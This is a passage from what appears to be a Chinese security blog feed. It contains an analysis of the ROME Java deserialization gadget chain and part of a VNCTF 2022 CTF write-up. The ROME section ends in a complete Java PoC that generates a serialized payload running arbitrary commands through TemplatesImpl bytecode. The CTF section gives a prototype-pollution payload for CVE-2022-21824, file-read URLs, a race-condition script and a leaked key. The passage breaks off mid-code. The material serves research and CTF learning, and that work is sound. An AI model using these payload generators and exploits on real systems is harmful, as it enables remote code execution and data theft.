title="ToStringBean.toString(String prefix)"></a>ToStringBean.toString(String prefix)</h2><p>首先分析这条链子的核心部分，可以看到ysoserial两次实例化了ObjectBean类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419091345-gcm8lww.png" alt="image.png"></p><p>出现问题的地方就是<code>ToStringBean.toString(String prefix)</code>，使用了invoke来反射调用方法，但是这个方法需要是无参的</p><p>如果这里我们能够调用恶意Templates类的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>方法，就能动态加载恶意字节码从而触发命令执行</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419091618-9ms9eln.png" alt="image.png"></p><p>但首先要解决的是<code>PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);</code></p><p>在构造方法中，<code>new ToStringBean(beanClass, obj);</code>传入的beanClass就是<code>BeanIntrospector.getPropertyDescriptors(this._beanClass);</code>中的<code>this._beanClass</code></p><p>接下来跟进<code>BeanIntrospector.getPropertyDescriptors</code>这个静态方法</p><h3 id="BeanIntrospector-getPropertyDescriptors"><a href="#BeanIntrospector-getPropertyDescriptors" class="headerlink" title="BeanIntrospector.getPropertyDescriptors"></a>BeanIntrospector.getPropertyDescriptors</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419093444-30g7vw8.png" alt="image.png"></p><p>调试时候发现要进到判断里去，跟进getPDs</p><p>这个方法主要是获取一个Class所有的getters和setters</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419094733-1v82rar.png" alt="image.png"></p><p>调试中发现他获取了这个Templates类的outputProperties方法，他还有个重载方法用来获取具体的方法数组</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419094928-cvyu0r1.png" alt="image.png"></p><h3 id="PropertyDescriptor"><a href="#PropertyDescriptor" class="headerlink" title="PropertyDescriptor"></a>PropertyDescriptor</h3><p>这个类是<code>java.beans</code>包下的工具类</p><p>PropertyDescriptor 类表示 JavaBean 类通过存储器导出一个属性。</p><p>构造方法有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor(String propertyName, Class&lt;?&gt; beanClass)</span><br><span class="line"></span><br><span class="line">PropertyDescriptor(String propertyName, Class&lt;?&gt; beanClass, String readMethodName, String writeMethodName)</span><br><span class="line"></span><br><span class="line">PropertyDescriptor(String propertyName, Method readMethod, Method writeMethod)</span><br></pre></td></tr></table></figure><p>常用方法有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; getPropertyType() <span class="comment">// 获取属性的java类型对象</span></span><br><span class="line">Method <span class="title function_">getReadMethod</span><span class="params">()</span> <span class="comment">// 获得用于读取属性值的方法</span></span><br><span class="line">Method <span class="title function_">getWriteMethod</span><span class="params">()</span> <span class="comment">// 获得用于写入属性值的方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setReadMethod</span><span class="params">(Method readMethod)</span> <span class="comment">// Sets the method that should be used to read the property value.</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setWriteMethod</span><span class="params">(Method writeMethod)</span> <span class="comment">//Sets the method that should be used to write the property value.</span></span><br></pre></td></tr></table></figure><h3 id="ToStringBean-toString"><a href="#ToStringBean-toString" class="headerlink" title="ToStringBean.toString"></a>ToStringBean.toString</h3><p>回到<code>ToStringBean.toString(String prefix)</code></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419095538-62z98f5.png" alt="image.png"></p><p>66行getName没啥用</p><p>67行拿到PropertyDescriptor中的method，就能够进到反射调用方法了</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419100847-aasd88j.png" alt="image.png"></p><p>因此构造toStringBean的时候，我们只要指定<code>this._obj</code>为我们的恶意字节码Template类，也就是反射方法的调用者</p><p><code>this._beanClass</code>为Templates.class，来获取到它唯一的getter，也就是getOutputProerties()方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419101223-s954a3r.png" alt="image.png"></p><h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419101625-6wc3v2o.png" alt="image.png"></p><h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean.hashCode"></a>ObjectBean.hashCode</h2><p>接下来就是分析调用链了，hashCode方法是我们常用的一个把攻击链串起来的方法，ObjectBean中也有，并且通过它我们能够实现接下来的一系列攻击链调用</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419102201-gt25t3i.png" alt="image.png"></p><p>他会调用EqualsBean中的beanHashCode方法，这个类是我们在构造阶段可以控制的</p><h3 id="EqualsBean-beanHashCode"><a href="#EqualsBean-beanHashCode" class="headerlink" title="EqualsBean.beanHashCode"></a>EqualsBean.beanHashCode</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419102247-vhejqfm.png" alt="image.png"></p><p>调用了toString，而这里的<code>this._obj</code>我们也可控</p><p>也就是说我们可以先构造一个含有equalBean的ObjectBean，然后把装载恶意template的toStringBean放进去</p><p>这样当调用ObjectBean.hashCode的时候就能完成调用。</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>入口类还是HashMap，因此整个链子的构造也很清楚，我们尝试自己编写payload</p><h1 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h1><p>自己编写生成payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.romeAttack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeSer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建包含toSringBean的ObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">tSB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建equalBean的ObjectBean</span></span><br><span class="line">        <span class="comment">//创建一个无害的ObjectBean插入，避免在payload阶段反序列化</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;foo&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(bean, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_equalsBean&quot;</span>,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, tSB));</span><br><span class="line">        <span class="type">ByteOutputStream</span> <span class="variable">byteOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\AEQAQ\\Desktop\\gc\\1.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        clazz.setName(randomClassName);</span><br><span class="line">        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419111727-5hcl2bn.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">rome反序列化链初探</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="java反序列化" scheme="https://xianbeil.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>vnctf2022</title>
    <link href="https://xianbeil.github.io/2022/04/06/vnctf2022/"/>
    <id>https://xianbeil.github.io/2022/04/06/vnctf2022/</id>
    <published>2022-04-06T10:40:27.000Z</published>
    <updated>2022-06-02T00:37:00.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>陆陆续续把比赛都复现过去，随缘放到博客。</p><p>参考链接：</p><p><a href="http://www.yongsheng.site/2022/02/16/vnctf-2022/">http://www.yongsheng.site/2022/02/16/vnctf-2022/</a></p><p><a href="https://chowdera.com/2022/02/202202170129375291.html">https://chowdera.com/2022/02/202202170129375291.html</a></p><h1 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h1><p>data.js中有flag</p><p>VNCTF{Welcome_to_VNCTF2022}</p><h1 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>考点为cve-2022-21824，vm2虚拟机逃逸，污染原型链</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm2 = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> vm2.<span class="title class_">NodeVM</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/eval&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.<span class="property">body</span>.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">if</span> (!e) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(<span class="string">&quot;module.exports=&quot;</span>+e)?.<span class="title function_">toString</span>() ?? <span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[k]);</span><br><span class="line">    res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> p = req.<span class="property">query</span>.<span class="property">path</span> || <span class="string">&quot;/src/index.js&quot;</span>;</span><br><span class="line">  p = path.<span class="title function_">join</span>(path.<span class="title function_">resolve</span>(<span class="string">&quot;.&quot;</span>), path.<span class="title function_">resolve</span>(p));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">  res.<span class="title function_">sendFile</span>(p);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>这道题用了vm2模块，但是都是最新包，暂不存在能够逃逸的1day。</p><blockquote><p>镜像为node:lts-alpine，package.json全部为最新包</p></blockquote><p>拿到flag的条件是<code>Object.keys(Object.prototype).length &gt; 0</code>，即Object原型的属性需要大于1</p><blockquote><p><code>Object.keys</code> 返回一个所有元素为字符串的数组，其元素来自于从给定的<code>object</code>上面可直接枚举的属性。这些属性的顺序与手动遍历该对象属性时的一致。</p></blockquote><p>原题：<a href="https://brycec.me/posts/dicectf_2022_writeups#vm-calc">https://brycec.me/posts/dicectf_2022_writeups#vm-calc</a></p><p>题中可以得知是node新修复的漏洞，<a href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824</a></p><p>而题目环境中node为<code>FROM node:16.13.1-bullseye-slim</code>，这个通过题目发布时的镜像版本可以得知存在此原型链污染漏洞</p><p>复现时hackerone已经发布了漏洞相关报告</p><p><a href="https://hackerone.com/reports/1431042">https://hackerone.com/reports/1431042</a></p><p>换低版本的node，复现成功。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316204046-1lf32ch.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.table([&#123;x:<span class="number">1</span>&#125;],[<span class="string">&#x27;__proto__&#x27;</span>])</span><br></pre></td></tr></table></figure><h1 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>考点为条件竞争，线程漏洞</p><p>可以用file协议或者netdoc协议读取文件目录和下载文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br><span class="line">netdoc:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br></pre></td></tr></table></figure><p>组件包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commons<span class="operator">-</span>lang3<span class="number">-3.7</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br></pre></td></tr></table></figure><p>然后可以把class文件都下下来反编译</p><p>Secr3t类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316212409-0qtg9rl.png" alt="image.png"></p><p>看Servlet</p><p>处理get请求，传入一个name参数，但是这里判断上下一样，矛盾了，这里没有<strong>处理多线程，存在条件竞争漏洞</strong></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316221036-8nn5b5f.png" alt="image.png"></p><p>多线程请求绕过，让Servlet内部出错拿到key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">host = <span class="string">&quot;http://d279b171-e8d9-4364-9c3f-0623e93535a1.node4.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myThread</span> (threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        runing(self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runing</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     r = requests.get(host+<span class="string">&quot;/evi1?name=%s&quot;</span> % name)</span><br><span class="line">     r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">     <span class="keyword">if</span> r.text.find(<span class="string">&quot;The Key is&quot;</span>)!=-<span class="number">1</span>:</span><br><span class="line">         <span class="built_in">print</span>(r.text)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">thread1 = myThread(<span class="string">&quot;aaaaaaa&quot;</span>)</span><br><span class="line">thread2 = myThread(<span class="string">&quot;vnctf2022&quot;</span>)</span><br><span class="line"></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DkF6nMYB5CeQioYpRNLFPt0wTLOWaFF5</span><br></pre></td></tr></table></figure><p>看处理Post请求</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235554-r808ne8.png" alt="image.png"></p><p>先用<code>SerAndDe.deserialize</code>反序列化对象，然后再用<code>User.equals()</code>来比较</p><p>看下User类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235838-vq9ebsc.png" alt="image.png"></p><blockquote><p>将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</p></blockquote><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235910-zk7f80c.png" alt="image.png"></p><p>重写writeObject方法强制写入height域</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    out.defaultWriteObject();</span><br><span class="line">    out.writeObject(<span class="built_in">this</span>.height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后序列化传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>((String) <span class="string">&quot;m4n_q1u_666&quot;</span>, (String) <span class="string">&quot;666&quot;</span>, (String) <span class="string">&quot;180&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span 